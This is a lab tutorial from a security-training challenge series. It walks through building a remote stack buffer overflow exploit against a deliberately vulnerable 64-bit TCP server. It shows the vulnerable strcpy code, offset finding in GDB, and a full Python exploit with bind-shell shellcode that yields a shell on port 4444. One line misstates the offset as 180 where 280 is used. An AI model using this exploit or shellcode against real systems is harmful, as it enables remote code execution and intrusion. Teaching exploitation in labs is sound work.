# Development of a remote buffer overflow exploit - 64 bit

## Introduction

We will create a functional exploit for a remote 64bit program with a stack overflow vulnerability - 
a remote exploit. 


### Source

* Source directory: `~/challenges/challenge13/`
* Source files: [challenge13](https://github.com/dobin/yookiterm-challenges-files/tree/master/challenge13)

You can compile it by calling `make` in the folder `~/challenges/challenge13`

The source is similar to challenge12. Same vulnerability, but different input vector.
Instead of giving the vulnerable data via stdin (or previously, command line arguments), we now
send it via TCP/IP socket.


### Vulnerability

The vulnerability lies here:

```
void handleData(char *username, char *password) {
    char name[128];
    ...
    strcpy(name, username);
    ...
}

void handleClient (int socket) {
   char username[1024];
   char password[1024];

   read(socket, username, 1023);
   read(socket, password, 1023);

   int ret = handleData(username, password);
   ...
}
```

## Usage

The server expects two messages - similar to challenge12, but this time they
are not read via stdin, but from a TCP/IP socket:

```sh
$ nc localhost 5001
Username: test
Password: test
Not admin.
```

But username overflows nevertheless. 


## How to interact with server with python pwntools




###########################################

## Debugging notes

### Hanging

The program may hang. If you debug it again, you have to kill it:
```
root@hlUbuntu64:~/challenges/challenge13# ./challenge13
ERROR on binding: Address already in use

root@hlUbuntu64:~/challenges/challenge13# pkill challenge13
root@hlUbuntu64:~/challenges/challenge13# pkill gdb  # for good measure
```

### Debug the server

Set `follow-fork-mode child` in GDB to follow the children (should be enabled by default).

Start the server in the background:
```
root@hlUbuntu64:~/challenges/challenge13# ./challenge13 &
[1] 12345
```

Note the PID. Start gdb, and attach the the server (-parent). The process will be stopped, so we
continue with `c`:
```
root@hlUbuntu64:~/challenges/challenge13# gdb -q
gdb-peda$ attach 12345
...
gdb-peda$ c
```

The `attach` command is in the GDB command history.
Reattach to the parent when the child crashed:

Every time the server spawn a child, GDB will follow it. When you are finished debugging,
and want to try the next version of the exploit, reattach and continue (`attach 12345` then `c`)


## Finding the offset

The offset should be 280. You should verify this by sending a payload, and obsever the output in GDB:
```
root@hlUbuntu64:~/challenges/challenge13# python -c 'import sys; sys.stdout.write("XXXX" + "A" * (280-4) + "BBBB"') | nc localhost 5001
```
Note we use `sys.stdout.write()` instead of `print()`, as the latter will always output a newline, while `write()` doesnt. There is also a extra
pattern of "XXXX" at the beginning, which will be used shortly.

Payload:
```
XXXXAAAAA...AAAAAABBBB
```

GDB will show something like:
```
RIP: 0x42424242 ('BBBB\n')
...
Stopped reason: SIGSEGV
0x0000000042424242 in ?? ()
```

## Find the memory address

The GDB plugin Peda provides a function to search the memory for a pattern. As we already have the
child process crashed with out pattern in GDB, lets get the memory address:

```
gdb-peda$ find XXXX
Searching for 'XXXX' in: None ranges
Found 3 results, display max 3 items:
   libc : 0x7ffff79626bc --> 0x2e00585858585858 ('XXXXXX')
[stack] : 0x7fffffffdbf0 ("XXXX", 'A' <repeats 196 times>...)
[stack] : 0x7fffffffe120 ("XXXX", 'A' <repeats 196 times>...)
```

Lets try the last one: `0x7fffffffe120`:

```
gdb-peda$ x/32x 0x7fffffffe120
0x7fffffffe120: 0x58    0x58    0x58    0x58    0x41    0x41    0x41    0x41
0x7fffffffe128: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe130: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe138: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
gdb-peda$ x/1s 0x7fffffffe120
0x7fffffffe120: "XXXX", 'A' <repeats 196 times>...
```

Looking good.

## Exploit

Copy the file `challenge13-exp-skel.py`, open it and make the following changes.

We use the shellcode address `0x7fffffffe120`. Convert the address with `[::-1]` in little-endian format.
```python
ret_addr = "\x7f\xff\xff\xff\xe1\x20"[::-1]
```

Use the verified offset: `180`
```
offset = 280
```

Full exploit:
```
root@hlUbuntu64:~/challenges/challenge13# cat challenge13-exp-skel.py
#!/usr/bin/python

import sys
import socket

shellcode = "\x48\x31\xc9\x48\x81\xe9\xf5\xff\xff\xff\x48\x8d\x05\xef" + "\xff\xff\xff\x48\xbb\xd2\x44\xe6\x0a\xfb\xc8\x96\x10\x48" + "\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xb8\x6d\xbe" + "\x93\x91\xca\xc9\x7a\xd3\x1a\xe9\x0f\xb3\x5f\xc4\xd7\xd6" + "\x60\xe4\x0a\xea\x94\xde\x99\x34\x2e\xf6\x50\x91\xf9\xce" + "\x1f\xd7\x2e\xd4\x52\xf4\xcd\xde\x21\x24\x2e\xcd\x52\xf4" + "\xcd\xde\x87\xb8\x47\xb8\x42\x04\x06\xfc\x31\x8a\x4b\xe3" + "\x7f\x0d\xa2\xad\x48\x4b\x0c\x5d\x25\x99\xa1\xf8\x3f\xa1" + "\x2c\xe6\x59\xb3\x41\x71\x42\x85\x0c\x6f\xec\xf4\xcd\x96" + "\x10"

buf_size = 256
offset = 280
ret_addr = "\x7f\xff\xff\xff\xe1\x20"[::-1]

exploit = "\x90" * (buf_size - len(shellcode))
exploit += shellcode
exploit += "A" * (offset - len(exploit))
exploit += ret_addr

sys.stdout.write(exploit)
```

Reattach GDB to the parent, and test it:
```
root@hlUbuntu64:~/challenges/challenge13# ./challenge13-exp.py | nc localhost 5001

```

If everything works, the exploit will block. Open a new terminal, and connect
to localhost:4444, where the shellcode started our shell:
```
root@hlUbuntu64:~/challenges/challenge13# nc -v localhost 4444
nc: connect to localhost port 4444 (tcp) failed: Connection refused
root@hlUbuntu64:~/challenges/challenge13# nc -v localhost 4444
Connection to localhost 4444 port [tcp/*] succeeded!
ls
Makefile
challenge13
challenge13-exp-skel.py
challenge13-exp.py
challenge13.c
peda-session-challenge13.txt
```

Use nc parameter `-v` to know if it was able to connect or not.
Note that there is no output if you just connect, you need to type in a command.


## Questions

* Can you make the exploit work, if the program is started standalone (without GDB)?
* Instead of the listener shellcode, can you use a connect-back shellcode?
